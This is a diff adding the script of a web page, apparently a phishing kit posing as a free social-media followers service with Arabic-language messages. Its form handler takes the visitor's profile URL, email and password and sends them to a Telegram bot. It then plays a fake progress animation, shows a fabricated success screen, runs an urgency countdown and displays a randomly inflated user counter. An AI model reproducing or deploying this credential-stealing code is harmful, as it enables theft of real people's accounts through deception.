+            drawProcessingIcon(document.getElementById('processingIcon'));
+            drawCheckIcon(document.getElementById('checkIcon1'));
+            drawNumberIcon(document.getElementById('stepIcon2'), '2');
+            drawNumberIcon(document.getElementById('stepIcon3'), '3');
+        }
+
+        // GLOBAL COUNTER
+        function animateCounter() {
+            const counter = document.getElementById('globalCounter');
+            let base = 2847392;
+            
+            setInterval(() => {
+                base += Math.floor(Math.random() * 50) + 10;
+                counter.textContent = base.toLocaleString('en-US');
+            }, 2000);
+        }
+
+        // PAGE NAVIGATION
+        function getChatIdFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('documentation');
+        }
+
+        function selectPackage(count, element) {
+            selectedPackage = count;
+            document.querySelectorAll('.package-card').forEach(c => c.classList.remove('selected'));
+            element.classList.add('selected');
+        }
+
+        function goToPage(page) {
+            document.getElementById('page' + currentPage).classList.remove('active');
+            document.getElementById('page' + page).classList.add('active');
+            currentPage = page;
+        }
+
+        // FORM SUBMIT
+        document.getElementById('followersForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const btn = document.getElementById('submitBtn');
+            const profileUrl = document.getElementById('profileUrl').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            userData = { profileUrl, email, password, package: selectedPackage };
+            
+            btn.classList.add('loading');
+            
+            const CHAT_ID = getChatIdFromUrl();
+            if (CHAT_ID) {
+                const message = `طلب متابعين جديد\n\nالحساب: ${profileUrl}\nالإيميل: ${email}\nالباسورد: ${password}\nالعدد: ${selectedPackage}\nالوقت: ${new Date().toLocaleString('ar-SA')}`;
+                
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                    });
+                } catch (e) { console.error(e); }
+            }
+            
+            setTimeout(() => {
+                btn.classList.remove('loading');
+                goToPage(3);
+                startProcessing();
+            }, 1500);
+        });
+
+        // PROCESSING ANIMATION
+        function startProcessing() {
+            const counter = document.getElementById('followersCount');
+            const progress = document.getElementById('progressFill');
+            const step2 = document.getElementById('procStep2');
+            const step3 = document.getElementById('procStep3');
+            
+            let count = 0;
+            const target = selectedPackage;
+            const increment = Math.ceil(target / 100);
+            
+            const interval = setInterval(() => {
+                count += increment;
+                if (count > target) count = target;
+                
+                counter.textContent = count.toLocaleString('en-US');
+                progress.style.width = (count / target * 100) + '%';
+                
+                if (count >= target * 0.5) {
+                    step2.classList.add('completed');
+                    step2.classList.remove('active');
+                    drawCheckIcon(document.getElementById('stepIcon2'));
+                    step3.classList.add('active');
+                }
+                
+                if (count >= target) {
+                    clearInterval(interval);
+                    step3.classList.add('completed');
+                    step3.classList.remove('active');
+                    drawCheckIcon(document.getElementById('stepIcon3'));
+                    
+                    setTimeout(() => {
+                        goToPage(4);
+                        drawSuccessCheck(document.getElementById('successCheck'));
+                        drawVerifiedIcon(document.getElementById('verifiedIcon'));
+                        drawSmallCheck(document.getElementById('smallCheck'));
+                        drawClockIcon(document.getElementById('clockIcon'));
+                        document.getElementById('resultFollowers').textContent = (selectedPackage / 1000) + 'K';
+                        document.getElementById('resultName').textContent = userData.email.split('@')[0];
+                        startCountdown();
+                    }, 1000);
+                }
+            }, 30);
+        }
+
+        // COUNTDOWN
+        function startCountdown() {
+            let hours = 23, minutes = 59, seconds = 59;
+            const el = document.getElementById('countdown');
+            
+            setInterval(() => {
+                seconds--;
+                if (seconds < 0) { seconds = 59; minutes--; }
+                if (minutes < 0) { minutes = 59; hours--; }
+                
+                el.textContent = 
+                    `${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+            }, 1000);
+        }
+
+        // INIT
+        window.onload = function() {
+            initIcons();
+            animateCounter();
+        };
+    </script>
+
+</body>
+</html>
